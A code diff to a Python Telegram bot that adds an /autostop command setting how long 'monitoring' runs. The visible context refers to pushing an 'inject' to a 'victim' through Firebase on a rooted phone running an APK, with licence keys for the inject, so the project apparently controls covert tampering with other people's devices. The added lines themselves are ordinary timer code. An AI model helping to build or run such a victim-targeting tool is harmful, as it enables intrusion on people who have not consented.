@@ -359,7 +359,7 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         inject_total_ms=inject_total_ms or 15,
         startup_test_sent=startup_test_sent,
     )
-    schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
+    schedule_auto_stop(user.id, _auto_stop_minutes(profile))
 
 
 async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -883,7 +883,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         inject_total_ms=inject_total_ms or 15,
         startup_test_sent=startup_test_sent,
     )
-    schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
+    schedule_auto_stop(user.id, _auto_stop_minutes(profile))
 
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1061,11 +1061,74 @@ async def injecttest_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
             ),
             parse_mode="HTML",
         )
-        schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
+        schedule_auto_stop(user.id, _auto_stop_minutes(profile))
     else:
         await update.message.reply_text(
             "❌ Inject victim Firebase pe push fail — /mynum, KEY, device DB check karo\n"
             "APK phone: START SERVICE ON + same KEY + rooted",
+            parse_mode="HTML",
+        )
+
+
+def _auto_stop_minutes(profile: MonitorProfile) -> int:
+    if profile.auto_stop_minutes is None:
+        return 15
+    return profile.auto_stop_minutes
+
+
+async def autostop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Set monitoring auto-stop timer (/autostop 60 or /autostop 0 to disable)."""
+    user = update.effective_user
+    if not await reply_if_unauthorized(update):
+        return
+
+    db: Session = SessionLocal()
+    try:
+        profile = get_or_create_monitor_profile(db, user.id)
+        if not context.args:
+            minutes = _auto_stop_minutes(profile)
+            status = "OFF (manual /stop tak)" if minutes <= 0 else f"{minutes} minutes"
+            await update.message.reply_text(
+                f"⏱️ <b>Auto-stop:</b> {status}\n\n"
+                "<code>/autostop 60</code> — 60 min baad band\n"
+                "<code>/autostop 0</code> — auto-stop band (jab tak /stop na karo)",
+                parse_mode="HTML",
+            )
+            return
+
+        raw = context.args[0].strip().lower()
+        if raw in {"off", "0", "disable", "none", "no"}:
+            minutes = 0
+        else:
+            try:
+                minutes = int(raw)
+            except ValueError as exc:
+                raise ValueError("Minutes number do — e.g. /autostop 60 ya /autostop 0") from exc
+            if minutes < 0 or minutes > 720:
+                raise ValueError("0 (off) ya 1–720 minutes allowed")
+
+        profile.auto_stop_minutes = minutes
+        db.commit()
+        db.refresh(profile)
+
+        if profile.is_monitoring:
+            cancel_auto_stop(user.id)
+            if minutes > 0:
+                schedule_auto_stop(user.id, minutes)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}")
+        return
+    finally:
+        db.close()
+
+    if minutes <= 0:
+        await update.message.reply_text(
+            "✅ Auto-stop <b>OFF</b> — monitoring tab tak chalegi jab tak /stop na karo.",
+            parse_mode="HTML",
+        )
+    else:
+        await update.message.reply_text(
+            f"✅ Auto-stop set: <b>{minutes} min</b>\nMonitoring ON ho to timer dubara start hoga.",
             parse_mode="HTML",
         )
 
@@ -1502,7 +1565,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                 inject_total_ms=inject_total_ms or 15,
                 startup_test_sent=startup_test_sent,
             )
-            schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
+            schedule_auto_stop(user.id, _auto_stop_minutes(profile))
             return
 
         if data == "monitor:on":
@@ -1533,6 +1596,7 @@ async def _post_init_set_commands(app: Application) -> None:
         BotCommand("key", "License key for inject"),
         BotCommand("addchannel", "Link Telegram channel"),
         BotCommand("startmonitor", "Start monitoring"),
+        BotCommand("autostop", "Auto-stop timer (minutes)"),
         BotCommand("stop", "Pause monitoring"),
         BotCommand("resume", "Resume monitoring"),
         BotCommand("status", "Current stats"),
@@ -1582,6 +1646,7 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("send", send_command))
     app.add_handler(CommandHandler("ping", ping_command))
     app.add_handler(CommandHandler("injecttest", injecttest_command))
+    app.add_handler(CommandHandler("autostop", autostop_command))
     app.add_handler(CommandHandler("approve", approve_command))
     app.add_handler(CommandHandler("adduser", approve_command))
     app.add_handler(CommandHandler("revoke", revoke_command))
